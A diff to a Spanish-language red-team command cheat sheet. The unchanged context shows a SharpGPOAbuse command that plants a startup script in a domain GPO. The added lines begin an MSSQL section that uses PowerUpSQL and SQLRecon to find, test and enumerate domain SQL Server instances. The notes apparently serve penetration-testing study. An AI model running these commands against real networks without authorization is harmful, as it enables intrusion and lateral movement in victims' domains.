@@ -457,3 +457,22 @@ Modificar la GPO
 ```
 execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b comando" --GPOName "NOMBRE_GPO"
 ```
+
+# MSSQL (Microsoft SQL Server)
+## Enumeración
+Importar el módulo de PS para la enumeración de MSSQL
+```
+powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
+```
+Ver donde se encuentra el MSSQL
+```
+powershell Get-SQLInstanceDomain
+```
+Ver si es accesible desde nuestro equipo
+```
+powershell Get-SQLConnectionTest -Instance "instancia,1433" | fl
+```
+Información del MSSQL (/m:whoami para ver los roles que tiene nuestro usuario)
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:HOST /module:info
+```
